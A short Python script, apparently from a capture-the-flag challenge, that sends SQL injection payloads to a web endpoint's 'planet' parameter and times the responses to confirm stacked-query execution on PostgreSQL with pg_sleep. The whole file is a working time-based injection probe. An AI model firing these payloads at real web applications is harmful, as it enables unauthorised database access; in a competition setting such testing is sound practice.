"""Prove stacked execution with a timing test before writing anything."""
import time
import urllib.parse
import urllib.request

BASE = "https://planetary.web.2026.sunshinectf.games"


def probe(planet):
    url = BASE + "/probe?planet=" + urllib.parse.quote(planet, safe="")
    t = time.time()
    try:
        with urllib.request.urlopen(url, timeout=120) as r:
            b = r.read().decode("utf-8", "replace")
        return ("carrier" if "is-carrier" in b else "null"), time.time() - t
    except Exception as e:
        return type(e).__name__, time.time() - t


T = [
    ("baseline        ", "MARS' AND 1=1-- -"),
    ("stacked, no sleep", "MARS' AND 1=1; SELECT 1-- -"),
    ("stacked + sleep5 ", "MARS' AND 1=1; SELECT pg_sleep(5)-- -"),
    ("sleep in main    ", "MARS' AND (SELECT pg_sleep(5))IS NOT NULL-- -"),
    ("stacked sleep0   ", "MARS' AND 1=1; SELECT pg_sleep(0)-- -"),
]
for name, p in T:
    r, dt = probe(p)
    print("%s %-8s %5.1fs   %s" % (name, r, dt, p), flush=True)
    time.sleep(2)
